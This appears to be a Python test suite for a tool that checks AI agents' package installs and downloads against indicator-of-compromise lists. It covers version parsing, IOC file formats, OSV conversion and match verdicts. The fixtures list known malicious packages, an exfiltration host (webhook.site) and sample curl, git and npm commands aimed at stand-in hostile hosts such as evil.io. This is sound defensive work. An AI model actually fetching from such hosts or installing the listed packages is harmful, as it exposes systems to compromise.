"""--ioc FILE: offline matching of agent downloads against a known-bad list.

Every fixture is built in code. The spec is ioc-spec.md (N2a, pass 3); the
test names carry its §10 ids.
"""
from __future__ import annotations

import importlib.util
import io
import json
import os
import sys
import tempfile
import time
import unittest
from contextlib import redirect_stderr, redirect_stdout
from datetime import date, datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if "actualis" in sys.modules:
    af = sys.modules["actualis"]
else:
    spec = importlib.util.spec_from_file_location("actualis", ROOT / "actualis.py")
    af = importlib.util.module_from_spec(spec)
    sys.modules["actualis"] = af
    spec.loader.exec_module(af)

TS = datetime(2026, 10, 1, 12, 0, tzinfo=timezone.utc)


class TestVersions(unittest.TestCase):
    def test_semver_precedence(self):                                   # T-VER-1
        chain = ["1.0.0-alpha", "1.0.0-alpha.1", "1.0.0-alpha.beta", "1.0.0-beta",
                 "1.0.0-beta.2", "1.0.0-beta.11", "1.0.0-rc.1", "1.0.0"]
        keys = [af._ioc_semver_key(v) for v in chain]
        self.assertNotIn(None, keys)
        for a, b in zip(keys, keys[1:]):
            self.assertLess(a, b)
        self.assertEqual(af._ioc_semver_key("1.0.0+build.5"), af._ioc_semver_key("1.0.0"))
        self.assertEqual(af._ioc_semver_key("v1.2.3"), af._ioc_semver_key("1.2.3"))
        self.assertLess(af._ioc_semver_key("1.9.0"), af._ioc_semver_key("1.10.0"))
        for bad in ("1.2", "4", "01.2.3", "1.2.3-01", "latest", "^1.2.3", "1.2.3.4", "", "1.2.x",
                    "١.2.3"):
            self.assertIsNone(af._ioc_semver_key(bad), bad)

    def test_go_pseudo_versions(self):                                  # T-VER-2
        pseudo = af._ioc_semver_key("v0.0.0-20210101000000-abcdefabcdef")
        self.assertIsNotNone(pseudo)
        self.assertLess(pseudo, af._ioc_semver_key("v0.0.0"))
        self.assertLess(af._ioc_semver_key("v1.2.4-0.20210101000000-abcdefabcdef"),
                        af._ioc_semver_key("v1.2.4"))
        self.assertGreater(af._ioc_semver_key("v1.2.4-0.20210101000000-abcdefabcdef"),
                           af._ioc_semver_key("v1.2.3"))
        self.assertEqual(af._ioc_semver_key("v2.0.0+incompatible"), af._ioc_semver_key("v2.0.0"))

    def test_pep440(self):                                              # T-VER-3
        k = af._ioc_pep440_key
        self.assertEqual(k("1.0"), k("1.0.0"))
        chain = ["1.0.dev0", "1.0a1", "1.0b1", "1.0rc1", "1.0", "1.0.post1"]
        for a, b in zip(chain, chain[1:]):
            self.assertLess(k(a), k(b), (a, b))
        self.assertGreater(k("1!0.1"), k("2.0"))
        self.assertEqual(k("1.0+local.7"), k("1.0"))
        self.assertEqual(k("1.0alpha1"), k("1.0a1"))
        self.assertEqual(k("1.0beta1"), k("1.0b1"))
        for spelling in ("1.0c1", "1.0pre1", "1.0preview1", "1.0-rc.1"):
            self.assertEqual(k(spelling), k("1.0rc1"), spelling)
        self.assertLess(k("1.0a1.dev1"), k("1.0a1"))
        self.assertLess(k("1.0.post1.dev1"), k("1.0.post1"))
        self.assertGreater(k("1.0.post1.dev1"), k("1.0"))
        self.assertEqual(k("V1.0"), k("1.0"))
        for bad in ("latest", "1.0-foo", "", "x" * 129):
            self.assertIsNone(k(bad), bad)

    def test_triple_equals_is_string_equality(self):                    # T-VER-3
        spec = af._ioc_parse_spec("pypi", "===1.0-foo")
        self.assertTrue(af._ioc_spec_contains("pypi", spec, "1.0-foo"))
        self.assertFalse(af._ioc_spec_contains("pypi", spec, "1.0-FOO"))
        self.assertFalse(af._ioc_spec_contains("pypi", spec, "1.0"))


EXAMPLE = """\
# Shai-Hulud wave 1, converted from the Wiz CSV, 2025-09-17
npm:@ctrl/tinycolor@=4.1.1||=4.1.2   id=GHSA-0000-0000-0000 label=shai-hulud from=2025-09-14 until=2025-09-17
npm:eslint-config-prettier@8.10.1||9.1.1||10.1.6||10.1.7   id=MAL-2025-6022
pypi:Requests_Darwin.Lite            # PEP 503 normalises to requests-darwin-lite
crates:evil_crate@>=0.1.0,<0.1.5
go:github.com/evil/mod@<v1.4.2
oci:ghcr.io/evil/img@=sha256:3f2a0000000000000000000000000000000000000000000000000000000000ff
brew:python@3.12                     # the whole thing is the formula name
rubygems:rest-client                 # accepted, not checkable
host:webhook.site                    label=exfil
host:github.com/evil-org
host:=203.0.113.7
"""


class IocFiles:
    """Write IOC files into a temp dir and load them."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def write(self, content, name="iocs.txt"):
        path = self.dir / name
        if isinstance(content, str):
            content = content.encode("utf-8")
        path.write_bytes(content)
        return str(path)

    def load(self, content, name="iocs.txt", err=None):
        path = self.write(content, name)
        with redirect_stderr(err if err is not None else io.StringIO()):
            return af.load_ioc([path])

    def fails(self, content, *needles, name="iocs.txt"):
        with self.assertRaises(ValueError) as cm:
            self.load(content, name)
        msg = str(cm.exception)
        self.assertTrue(msg.startswith("--ioc"), msg)
        for n in needles:
            self.assertIn(n, msg)
        return msg


def entries(ioc):
    out = [e for es in ioc.packages.values() for e in es]
    out += [e for es in ioc.host_suffix.values() for e in es]
    out += [e for es in ioc.host_exact.values() for e in es]
    return sorted(out, key=lambda e: (e.source, e.line or 0))


def only(ioc):
    es = entries(ioc)
    assert len(es) == 1, es
    return es[0]


class TestLineFormat(IocFiles, unittest.TestCase):
    def test_example_lines(self):                                       # T-LINE-1
        ioc = self.load(EXAMPLE)
        got = {e.line: e for e in entries(ioc)}
        e = got[2]
        self.assertEqual((e.kind, e.eco, e.name, e.spec_text, e.ref, e.label, e.frm, e.until),
                         ("package", "npm", "@ctrl/tinycolor", "=4.1.1||=4.1.2", "GHSA-0000-0000-0000",
                          "shai-hulud", date(2025, 9, 14), date(2025, 9, 17)))
        self.assertEqual(got[3].spec_text, "=8.10.1||=9.1.1||=10.1.6||=10.1.7")
        self.assertEqual(got[3].ref, "MAL-2025-6022")
        self.assertEqual((got[4].eco, got[4].name, got[4].spec), ("pypi", "requests-darwin-lite", None))
        self.assertEqual((got[5].eco, got[5].name, got[5].spec_text), ("crates", "evil-crate", ">=0.1.0,<0.1.5"))
        self.assertEqual((got[6].eco, got[6].name, got[6].spec_text), ("go", "github.com/evil/mod", "<v1.4.2"))
        self.assertEqual((got[7].eco, got[7].name), ("oci", "ghcr.io/evil/img"))
        self.assertTrue(got[7].spec_text.startswith("=sha256:3f2a"))
        self.assertEqual((got[8].eco, got[8].name, got[8].spec), ("brew", "python@3.12", None))
        self.assertNotIn(9, got)
        self.assertEqual((got[10].kind, got[10].host, got[10].path, got[10].exact_host, got[10].label),
                         ("host", "webhook.site", "", False, "exfil"))
        self.assertEqual((got[11].host, got[11].path), ("github.com", "/evil-org"))
        self.assertEqual((got[12].host, got[12].exact_host), ("203.0.113.7", True))
        src = ioc.sources[0]
        self.assertEqual(src["entries"], {"package": 7, "host": 3})
        self.assertEqual(src["not_checkable"], {"rubygems": 1})
        self.assertEqual(src["format"], "lines")
        self.assertEqual(len(src["sha256"]), 64)
        self.assertTrue(ioc.has_window)
        self.assertEqual(set(ioc.packages), {("npm", "@ctrl/tinycolor"), ("npm", "eslint-config-prettier"),
                                             ("pypi", "requests-darwin-lite"), ("crates", "evil-crate"),
                                             ("go", "github.com/evil/mod"), ("oci", "ghcr.io/evil/img"),
                                             ("brew", "python@3.12")})
        self.assertEqual(set(ioc.host_suffix), {"webhook.site", "github.com"})
        self.assertEqual(set(ioc.host_exact), {"203.0.113.7"})

    def test_comments_blank_bom_crlf_and_no_final_eol(self):            # T-LINE-2
        ioc = self.load(b"\xef\xbb\xbf# head\r\n\r\n   \t\r\n  npm:a  # trailing\r\nnpm:b")
        self.assertEqual([(e.name, e.line) for e in entries(ioc)], [("a", 4), ("b", 5)])
        self.fails("npm:a#b\n", "line 1", "#")
        self.fails("npm:a id=x#y\n", "line 1")

    def test_ecosystem_aliases(self):                                   # T-LINE-3
        words = {"PyPI": "pypi", "pip": "pypi", "crates.io": "crates", "cargo": "crates",
                 "rust": "crates", "golang": "go", "docker": "oci", "container": "oci",
                 "homebrew": "brew", "NPM": "npm"}
        for word, eco in words.items():
            name = "github.com/x/y" if eco == "go" else "xyz"
            self.assertEqual(only(self.load(f"{word}:{name}\n")).eco, eco, word)
        msg = self.fails("npn:foo\n", 'unknown ecosystem "npn"', "known: npm pypi crates go oci brew")
        self.assertIn("not-checkable", msg)
        ioc = self.load("rubygems:x\nvscode:x\nnpm:y\n")
        self.assertEqual(ioc.sources[0]["not_checkable"], {"rubygems": 1, "vscode": 1})

    def test_scoped_npm(self):                                          # T-LINE-4
        e = only(self.load("npm:@s/n@1.2.3\n"))
        self.assertEqual((e.name, e.spec_text), ("@s/n", "=1.2.3"))
        self.assertIsNone(only(self.load("npm:@s/n\n")).spec)
        self.fails("npm:@s/n@\n", "line 1")

    def test_brew_never_splits(self):                                   # T-LINE-5
        e = only(self.load("brew:python@3.12\n"))
        self.assertEqual((e.name, e.spec), ("python@3.12", None))
        self.assertEqual(only(self.load("brew:User/Tap/Name\n")).name, "user/tap/name")

    def test_oci(self):                                                 # T-LINE-6
        e = only(self.load("oci:localhost:5000/x/y@=v1\n"))
        self.assertEqual((e.name, e.spec_text), ("localhost:5000/x/y", "=v1"))
        digest = "sha256:" + "ab" * 32
        self.assertEqual(only(self.load(f"oci:nginx@={digest}\n")).spec_text, "=" + digest)
        self.assertEqual(only(self.load("oci:docker.io/library/nginx@=1.25\n")).name, "nginx")
        self.fails("oci:nginx@=latest\n", "latest")
        self.fails("oci:nginx@>=1.25\n", "line 1")

    def test_rejections(self):                                          # T-LINE-7
        cases = {
            "npm:x@^1.2.0": "^ and ~ ranges are not accepted",
            "npm:x@~1.2.0": "^ and ~ ranges are not accepted",
            "npm:x@1.x": "wildcards are not accepted",
            "npm:x@1.*": "wildcards are not accepted",
            "npm:x@1.2.3,1.2.4": "a comma means AND",
            "npm:x@=1.2.3,=1.2.4": "a comma means AND",
            "npm:x@latest": "latest moves",
            "npm:x@1.2": "write 1.2.0",
            "npm:x@1.2.3||": "empty clause",
            "npm:x@||1.2.3": "empty clause",
            "npm:x@>=1.0.0,,<2.0.0": "empty comparator",
            "npm:x@>=1.0.0, <2.0.0": "key=value",
            "npm:x foo=1": 'unknown attribute "foo"',
            "npm:x id=a id=b": "repeated",
            "npm:x from=2025-02-30": "date",
            "npm:x from=2025-09-14 until=2025-09-13": "until",
            "host:https://x.io": "not a host",
            "host:x.io:8080": "not a host",
            "host:*.x.io": "not a host",
            "host:[::1]": "not a host",
            "npm:BAD NAME": "key=value",
            "pypi:-bad-": "not a valid pypi name",
            "go:nodot/mod": "not a valid go name",
        }
        for line, hint in cases.items():
            with self.subTest(line=line):
                self.fails(line + "\n", "line 1", hint)

    def test_any_version_spellings(self):                               # T-LINE-8
        for spec in ("", "@*", "@>=0", "@>=0.0.0"):
            self.assertIsNone(only(self.load(f"npm:x{spec}\n")).spec, spec)

    def test_broad_host_warning(self):                                  # T-LINE-9
        err = io.StringIO()
        ioc = self.load("npm:x\nhost:github.com\nhost:github.com/evil\n", err=err)
        self.assertEqual(len(entries(ioc)), 3)
        self.assertEqual(err.getvalue().count("matches every download from github.com; add a path"), 1)
        self.assertIn("line 2: host:github.com", err.getvalue())

    def test_caps(self):                                                # T-LINE-10
        self.fails("npm:x@=" + "1" * 129 + "\n", "over 128")
        self.fails("npm:x " + "#" * (1 << 20) + "\n", "line 1", "1 MiB")
        lines = "".join(f"npm:p{i}\n" for i in range(af.IOC_ENTRIES_MAX + 1))
        self.fails(lines, "over 1,000,000 entries; split by ecosystem")

    def test_nothing_checkable(self):                                   # T-LINE-11
        self.fails("", "none of the 0 entries can be checked")
        msg = self.fails("rubygems:a\nrubygems:b\nmaven:c\n", "none of the 3 entries can be checked")
        self.assertIn("rubygems 2", msg)
        self.assertIn("maven 1", msg)


class TestLoadErrors(IocFiles, unittest.TestCase):
    def test_unreadable_inputs_name_the_file(self):                     # T-CLI-1
        missing = str(self.dir / "nope.txt")
        with self.assertRaises(ValueError) as cm:
            af.load_ioc([missing])
        self.assertIn(f"--ioc {missing}: cannot read", str(cm.exception))
        with self.assertRaises(ValueError) as cm:
            af.load_ioc([str(self.dir)])
        self.assertIn("cannot read", str(cm.exception))
        self.fails(b"npm:a\nnpm:\xff\n", "iocs.txt line 2", "UTF-8")
        self.fails("npm:a\nnpm:b@^1.0.0\n", "iocs.txt line 2")

    def test_order_sets_source_and_duplicates_count(self):              # T-CLI-4
        a = self.write("npm:x\n", "a.txt")
        b = self.write("npm:x\nhost:evil.io\n", "b.txt")
        ioc = af.load_ioc([b, a])
        xs = ioc.packages[("npm", "x")]
        self.assertEqual([(e.source, e.line) for e in xs], [(0, 1), (1, 1)])
        self.assertEqual([Path(s["path"]).name for s in ioc.sources], ["b.txt", "a.txt"])


def osv(name="evil", eco="npm", versions=None, ranges=None, rid="MAL-2025-6022", **extra):
    affected = {"package": {"name": name, "ecosystem": eco}}
    if versions is not None:
        affected["versions"] = versions
    if ranges is not None:
        affected["ranges"] = ranges
    rec = {"id": rid, "affected": [affected]}
    rec.update(extra)
    return rec


def rng(*events, kind="SEMVER"):
    return {"type": kind, "events": [dict([e]) for e in events]}


class TestOsv(IocFiles, unittest.TestCase):
    def jsonl(self, *records, name="mal.jsonl"):
        return self.load("\n".join(json.dumps(r) for r in records) + "\n", name)

    def contains(self, entry, version):
        return af._ioc_spec_contains(entry.eco, entry.spec, version)

    def test_versions_list(self):                                       # T-OSV-1
        rec = osv("eslint-config-prettier", versions=["8.10.1", "9.1.1", "10.1.6", "10.1.7"],
                  summary="x", references=[{"type": "WEB", "url": "https://evil.example/x"}])
        ioc = self.load(json.dumps(rec), "MAL-2025-6022.json")
        e = only(ioc)
        self.assertEqual(len(e.spec), 4)
        self.assertEqual(e.spec_text, "=8.10.1||=9.1.1||=10.1.6||=10.1.7")
        self.assertEqual((e.ref, e.line, ioc.sources[0]["format"]), ("MAL-2025-6022", None, "osv-json"))
        self.assertTrue(self.contains(e, "10.1.6"))
        self.assertFalse(self.contains(e, "10.1.8"))

    def test_introduced_zero_is_any_version(self):                      # T-OSV-2
        self.assertIsNone(only(self.jsonl(osv(ranges=[rng(("introduced", "0"))]))).spec)
        self.assertIsNone(only(self.jsonl(osv())).spec)

    def test_ranges(self):                                              # T-OSV-3
        e = only(self.jsonl(osv(ranges=[rng(("fixed", "1.5.0"), ("introduced", "1.0.0"))])))
        self.assertEqual(e.spec_text, ">=1.0.0,<1.5.0")
        self.assertTrue(self.contains(e, "1.4.9"))
        self.assertFalse(self.contains(e, "1.5.0"))
        self.assertFalse(self.contains(e, "0.9.0"))
        e = only(self.jsonl(osv(ranges=[rng(("introduced", "1.0.0"), ("last_affected", "1.2.0"))])))
        self.assertEqual(e.spec_text, ">=1.0.0,<=1.2.0")
        self.assertTrue(self.contains(e, "1.2.0"))
        e = only(self.jsonl(osv(ranges=[rng(("introduced", "0"), ("fixed", "2.0.0"),
                                            ("introduced", "3.0.0"))])))
        self.assertEqual(e.spec_text, "<2.0.0||>=3.0.0")
        self.assertTrue(self.contains(e, "3.1.0"))
        self.assertFalse(self.contains(e, "2.5.0"))

    def test_limit(self):                                               # T-OSV-4
        ioc = self.jsonl(osv(ranges=[rng(("introduced", "1.0.0"), ("limit", "2.0.0"))]))
        self.assertEqual(only(ioc).spec_text, ">=1.0.0")
        self.assertEqual(ioc.sources[0]["ranges_with_limit"], 1)

    def test_git_range(self):                                           # T-OSV-5
        ioc = self.jsonl(osv(versions=["1.0.0"], ranges=[rng(("introduced", "abc"), kind="GIT")]))
        self.assertEqual((ioc.sources[0]["ranges_git"], only(ioc).spec_text), (1, "=1.0.0"))

    def test_withdrawn(self):                                           # T-OSV-6
        ioc = self.jsonl(osv(withdrawn="2025-01-01T00:00:00Z"), osv("other"))
        self.assertEqual((ioc.sources[0]["withdrawn"], only(ioc).name), (1, "other"))
        ioc = self.jsonl(osv(withdrawn=None))
        self.assertEqual(ioc.sources[0]["withdrawn"], 0)

    def test_malformed_is_counted_never_fatal(self):                    # T-OSV-7
        recs = [osv("ok"), [1, 2], {"id": "X", "affected": [{"package": {"ecosystem": "npm"}}]},
                osv("ok2", ranges=[rng(("introduced", "1.0.0"), ("bogus", "2.0.0"))]),
                osv("ok3", ranges=[{"type": "WHAT", "events": []}]),
                {"id": "Y", "affected": []}, osv("Bad Name")]
        ioc = self.jsonl(*recs)
        s = ioc.sources[0]
        self.assertEqual((s["skipped"], s["first_skipped_line"], s["skipped_ranges"]), (4, 2, 2))
        self.assertEqual(sorted(n for _, n in ioc.packages), ["ok", "ok2", "ok3"])
        for name in ("ok2", "ok3"):                  # an unusable range is undecidable, never dropped
            self.assertEqual(ioc.packages[("npm", name)][0].spec_text, "undecidable")

    def test_shapes_agree(self):                                        # T-OSV-8
        recs = [osv("a", versions=["1.0.0"]), osv("b", ranges=[rng(("introduced", "1.0.0"))])]
        one_ = self.load(json.dumps(recs[0]), "one.json")
        arr = self.load(json.dumps(recs), "arr.json")
        lines = self.jsonl(*recs)

        def shape(ioc):
            return sorted((e.eco, e.name, e.spec, e.ref) for e in entries(ioc))
        self.assertEqual(shape(arr), shape(lines))
        self.assertEqual(shape(one_), shape(arr)[:1])
        self.assertEqual(arr.sources[0]["format"], "osv-json")
        self.assertEqual(lines.sources[0]["format"], "osv-jsonl")
        self.fails('{"id": "x"}\n{"id": \n', "line 2")
        self.fails('[{"id": "x"}, ', "byte offset")

    def test_extra_data_falls_back_to_jsonl(self):                      # T-OSV-8
        a, b = osv("a", versions=["1.0.0"]), osv("b", versions=["2.0.0"])
        ioc = self.load(json.dumps(a) + "\n" + json.dumps(b) + "\n", "x.json")
        self.assertEqual(sorted(e.name for e in entries(ioc)), ["a", "b"])
        self.assertEqual(ioc.sources[0]["format"], "osv-jsonl")
        self.assertEqual([e.line for e in entries(ioc)], [1, 2])

    def test_ecosystem_mapping_is_exact(self):                          # T-OSV-9
        recs = [osv("a", "npm"), osv("b", "PyPI"), osv("c", "crates.io"), osv("github.com/x/d", "Go"),
                osv("e", "pypi"), osv("f", "RubyGems"), osv("g", "Debian:12"), osv("h", "Foo")]
        ioc = self.jsonl(*recs)
        self.assertEqual(sorted(ioc.packages), [("crates", "c"), ("go", "github.com/x/d"),
                                                ("npm", "a"), ("pypi", "b")])
        self.assertEqual(ioc.sources[0]["not_checkable"], {"pypi": 1, "rubygems": 1, "debian": 1, "foo": 1})

    def test_unparseable_pypi_range_is_undecidable(self):               # T-OSV-10
        e = only(self.jsonl(osv("x", "PyPI", ranges=[rng(("introduced", "1.0"), ("fixed", "not-a-version"),
                                                         kind="ECOSYSTEM")])))
        self.assertIsNone(self.contains(e, "1.5"))
        e = only(self.jsonl(osv("x", "PyPI", ranges=[rng(("introduced", "1.0"), ("fixed", "2.0"),
                                                         kind="ECOSYSTEM")])))
        self.assertTrue(self.contains(e, "1.5"))
        self.assertFalse(self.contains(e, "2.0.post1"))

    def test_references_make_no_host_entry(self):                       # T-OSV-11
        ioc = self.jsonl(osv(references=[{"type": "WEB", "url": "https://evil.example/"}]))
        self.assertEqual((ioc.host_suffix, ioc.host_exact), ({}, {}))
        self.assertEqual(ioc.sources[0]["entries"], {"package": 1, "host": 0})

    def test_over_the_whole_document_cap(self):                         # T-OSV-12
        recs = [osv(f"p{i}", versions=["1.0.0"]) for i in range(30)]
        old = af.IOC_WHOLE_JSON_MAX
        af.IOC_WHOLE_JSON_MAX = 1024
        try:
            self.fails(json.dumps(recs), "convert to JSONL", "jq -c")
            ioc = self.load("\n".join(json.dumps(r) for r in recs) + "\n", "big.json")
            self.assertEqual(len(entries(ioc)), 30)
            self.assertEqual(ioc.sources[0]["format"], "osv-jsonl")
            self.fails("npm:x\n" * 300, "over 1,024 bytes")
            whole = "\n".join(json.dumps(r) for r in recs) + "\n"
            self.assertEqual(ioc.sources[0]["sha256"],
                             __import__("hashlib").sha256(whole.encode()).hexdigest())
        finally:
            af.IOC_WHOLE_JSON_MAX = old


class FleetCase(IocFiles):
    """A fleet built from shell commands, with an IOC list applied."""

    def fleet(self, ioc_text, *cmds, mode="auto", trust=(), suppress=None, refuse=(), fail=(),
              ioc_name="iocs.txt"):
        f = af.Fleet()
        f.suppressions = dict(suppress or {})
        for k, cmd in enumerate(cmds):
            f.add_tool("proj", "Bash", {"command": cmd}, TS, mode, session="s1", call_id=f"t{k}")
        for k in refuse:
            f._network_outcome(f"claude:t{k}", refused=True)
        for k in fail:
            f._network_outcome(f"claude:t{k}", refused=False)
        af.apply_network_policy(f, af.parse_trust(list(trust)), strict=False)
        ioc = self.load(ioc_text, ioc_name) if ioc_text is not None else None
        af.apply_ioc(f, ioc)
        return f

    def verdict(self, ioc_text, cmd, **kw):
        f = self.fleet(ioc_text, cmd, **kw)
        self.assertLessEqual(len(f.ioc_rows), 1)
        return (f.ioc_rows[0]["verdict"], f.ioc_rows[0]["reason"]) if f.ioc_rows else None

    def ioc_flags(self, f):
        return [fl for fl in f.flags if any(c.startswith("network-ioc") for c in fl["categories"])]


MATCH_ANY = ("match", "any-version")
MATCH_IN = ("match", "version-in-spec")
UNRESOLVED = ("unresolved", "version-unresolved")


class TestResolution(FleetCase, unittest.TestCase):
    def test_npm(self):                                                 # T-RES-1
        for spec in ("@4", "@latest", "@^4.1.0", "@4.1", ""):
            self.assertEqual(self.verdict("npm:left-pad@=4.1.1\n", f"npm i left-pad{spec}"), UNRESOLVED, spec)
        for spec in ("@4.1.1", "@=4.1.1"):
            self.assertEqual(self.verdict("npm:left-pad@=4.1.1\n", f"npm i left-pad{spec}"), MATCH_IN, spec)
        self.assertIsNone(self.verdict("npm:left-pad@=4.1.1\n", "npm i left-pad@4.1.2"))

    def test_npm_alias_target(self):                                    # T-RES-2
        self.assertEqual(self.verdict("npm:evil@=1.0.0\n", "npm i x@npm:evil@1.0.0"), MATCH_IN)
        self.assertEqual(self.verdict("npm:x@=1.0.0\n", "npm i x@npm:evil@1.0.0"), UNRESOLVED)

    def test_go(self):                                                  # T-RES-3
        ioc = "go:github.com/evil/mod@<v1.4.2\n"
        for v in ("@v1.2", "@latest", "@master", "@1.2.3", ""):
            self.assertEqual(self.verdict(ioc, f"go get github.com/evil/mod{v}"), UNRESOLVED, v)
        self.assertEqual(self.verdict(ioc, "go get github.com/evil/mod@v1.2.3"), MATCH_IN)
        self.assertEqual(self.verdict(ioc, "go get github.com/evil/mod@v0.0.0-20210101000000-abcdefabcdef"),
                         MATCH_IN)
        self.assertIsNone(self.verdict(ioc, "go get github.com/evil/mod@v1.4.2"))

    def test_oci(self):                                                 # T-RES-4
        ioc = "oci:nginx@=1.25\n"
        self.assertEqual(self.verdict(ioc, "docker run nginx"), UNRESOLVED)
        self.assertEqual(self.verdict(ioc, "docker pull nginx:latest"), UNRESOLVED)
        self.assertEqual(self.verdict(ioc, "docker pull docker.io/library/nginx:1.25"), MATCH_IN)
        self.assertEqual(self.verdict(ioc, "docker run library/nginx:1.25"), MATCH_IN)
        self.assertEqual(self.verdict(ioc, "docker pull nginx@sha256:" + "a" * 64),
                         ("unresolved", "undecidable"))
        self.assertIsNone(self.verdict(ioc, "docker pull nginx:1.24"))

    def test_pypi(self):                                                # T-RES-5
        self.assertEqual(self.verdict("pypi:foo-bar@=1.0.0\n", "pip install Foo_Bar==1.0"), MATCH_IN)
        self.assertEqual(self.verdict("pypi:foo-bar@=1.0.0\n", "pip install 'foo.bar>=2'"), UNRESOLVED)
        self.assertEqual(self.verdict("pypi:foo-bar@===1.0-x\n", "pip install foo-bar===1.0-x"), MATCH_IN)

    def test_crates_after_b1(self):                                     # T-RES-6
        self.assertEqual(self.verdict("crates:foo@=1.2.3\n", "cargo install foo --version 1.2.3"), MATCH_IN)
        for cmd in ("cargo add serde@1.2", "cargo add serde@1.2.3"):
            self.assertEqual(self.verdict("crates:serde@>=1.0.0\n", cmd), UNRESOLVED, cmd)
        self.assertEqual(self.verdict("crates:serde@>=1.0.0\n", "cargo add serde@=1.2.3"), MATCH_IN)

    def test_npm_names_are_case_sensitive(self):                        # T-RES-7
        self.assertIsNone(self.verdict("npm:jsonstream\n", "npm i JSONStream@1.0.0"))
        self.assertEqual(self.verdict("npm:JSONStream\n", "npm i JSONStream@1.0.0"), MATCH_ANY)

    def test_brew(self):
        self.assertEqual(self.verdict("homebrew:Python@3.12\n", "brew install python@3.12"), MATCH_ANY)


class TestMatching(FleetCase, unittest.TestCase):
    def test_every_verdict_and_reason(self):                            # T-MAT-1
        self.assertEqual(self.verdict("npm:x\n", "npm i x"), MATCH_ANY)
        self.assertEqual(self.verdict("npm:x@>=1.0.0,<2.0.0\n", "npm i x@1.5.0"), MATCH_IN)
        f = self.fleet("npm:x@>=1.0.0,<2.0.0\n", "npm i x@2.0.0")
        self.assertEqual((f.ioc_rows, f.ioc_totals["clean_name_matches"]), ([], 1))
        undecidable = json.dumps(osv("x", "PyPI", ranges=[rng(("introduced", "1.0"), ("fixed", "bogus!"),
                                                               kind="ECOSYSTEM")]))
        self.assertEqual(self.verdict(undecidable, "pip install x==1.5", ioc_name="o.json"),
                         ("unresolved", "undecidable"))
        self.assertEqual(self.verdict("npm:x@=1.0.0\n", "npm i x@latest"), UNRESOLVED)
        self.assertEqual(self.verdict("host:evil.io\n", "curl https://evil.io/x"), ("match", "host"))
        self.assertEqual(self.verdict("npm:x@=1.0.0\n", "npm i --registry https://npm.corp x@1.0.0"),
                         ("unresolved", "private-registry"))

    def test_hosts(self):                                               # T-MAT-2
        self.assertEqual(self.verdict("host:evil.io\n", "curl https://a.evil.io/x"), ("match", "host"))
        self.assertIsNone(self.verdict("host:evil.io\n", "curl https://notevil.io/x"))
        self.assertIsNone(self.verdict("host:=evil.io\n", "curl https://a.evil.io/x"))
        self.assertEqual(self.verdict("host:=evil.io\n", "curl https://EVIL.io/x"), ("match", "host"))
        self.assertIsNone(self.verdict("host:github.com/evil-org\n",
                                       "git clone https://github.com/evil-organisation/r"))
        self.assertEqual(self.verdict("host:github.com/evil-org\n", "git clone https://github.com/evil-org/r"),
                         ("match", "host"))
        self.assertIsNone(self.verdict("host:github.com/evil-org\n",
                                       "curl https://github.com/evil-org/../good/x"))
        self.assertIsNone(self.verdict("host:registry.npmjs.org\n", "npm i x"))
        self.assertEqual(self.verdict("host:registry.npmjs.org\n", "npm i --registry https://registry.npmjs.org x"),
                         ("match", "host"))

    def test_go_module_origin(self):                                    # T-MAT-3
        self.assertEqual(self.verdict("host:github.com/evil\n", "go get github.com/evil/mod@v1.0.0"),
                         ("match", "host"))

    def test_npm_forge_shorthand(self):                                 # T-MAT-4
        self.assertEqual(self.verdict("host:github.com/evil-org\n", "npm i github:evil-org/x"), ("match", "host"))

    def test_private_registry_downgrade(self):                          # T-MAT-5
        f = self.fleet("npm:x@=1.0.0\n", "npm i --registry https://npm.corp x@1.0.0")
        [fl] = self.ioc_flags(f)
        self.assertEqual((fl["severity"], fl["categories"]), ("med", ["network-ioc-unresolved"]))
        self.assertIn("installed from npm.corp; the entry describes the public registry", fl["evidence"])
        self.assertEqual(self.verdict("npm:x@=1.0.0\n", "npm i x@1.0.0"), MATCH_IN)

    def test_refused_items(self):                                       # T-MAT-6
        f = self.fleet("npm:x\n", "npm i x@1.0.0", refuse=[0])
        [row] = f.ioc_rows
        self.assertTrue(row["refused"])
        self.assertIsNone(row["flag_id"])
        self.assertEqual(self.ioc_flags(f), [])
        self.assertEqual((f.ioc_totals["refused"], f.ioc_totals["match"], f.ioc_totals["items_checked"]), (1, 0, 0))
        self.assertEqual(f.network_items, [])
        self.assertEqual(af.failing_findings(f, "any"), [])

    def test_failed_items_keep_their_verdict(self):                     # T-MAT-7
        f = self.fleet("npm:x\n", "npm i x@1.0.0", fail=[0])
        self.assertEqual(f.ioc_rows[0]["verdict"], "match")
        self.assertIn("(call failed)", self.ioc_flags(f)[0]["evidence"])

    def test_trust_never_exempts(self):                                 # T-MAT-8
        f = self.fleet("npm:x@=1.0.0\n", "npm i x@1.0.0", trust=["registry.npmjs.org"])
        self.assertTrue(f.network_items[0]["trusted"])
        self.assertEqual(f.ioc_rows[0]["verdict"], "match")

    def test_strongest_entry_wins(self):                                # T-MAT-9
        f = self.fleet("npm:x id=A\nnpm:x@=1.0.0 id=B\nnpm:x@=2.0.0 id=C\nnpm:x@>=0.1.0,<0.2.0 id=D\n",
                       "npm i x@1.0.0")
        [row] = f.ioc_rows
        self.assertEqual((row["verdict"], [e.ref for e in row["entries"]]), ("match", ["A", "B"]))
        f = self.fleet("npm:x@=1.0.0 id=B\nnpm:x id=A\n", "npm i x")
        self.assertEqual((f.ioc_rows[0]["verdict"], [e.ref for e in f.ioc_rows[0]["entries"]]), ("match", ["A"]))

    def test_coverage(self):                                            # T-MAT-10
        f = self.fleet("npm:zzz\n", "npm ci", "pip install -r r.txt", "curl $U", "git pull origin",
                       "npm i x", "curl https://a.io/x", "brew tap o/r", "go get github.com/o/m@v1.0.0")
        t = f.ioc_totals
        self.assertEqual(t["items_not_checkable"], {"lockfile": 2, "no_host": 2, "other": 1})
        self.assertEqual(t["items_checked"], 3)
        self.assertEqual(t["items_checked"] + sum(t["items_not_checkable"].values()), len(f.network_items))

    def test_without_ioc_nothing_happens(self):
        f = self.fleet(None, "npm i x@1.0.0")
        self.assertIsNone(f.ioc)
        self.assertEqual((f.ioc_rows, f.network_items[0]["ioc"]), ([], None))
        self.assertEqual(f.ioc_totals, af._ioc_zero_totals())

    def test_item_ioc_field(self):
        f = self.fleet("npm:x\nnpm:y@=1.0.0\n", "npm i x", "npm i y", "npm i z")
        self.assertEqual(sorted((i["package"], i["ioc"]) for i in f.network_items),
                         [("x", "match"), ("y", "unresolved"), ("z", None)])


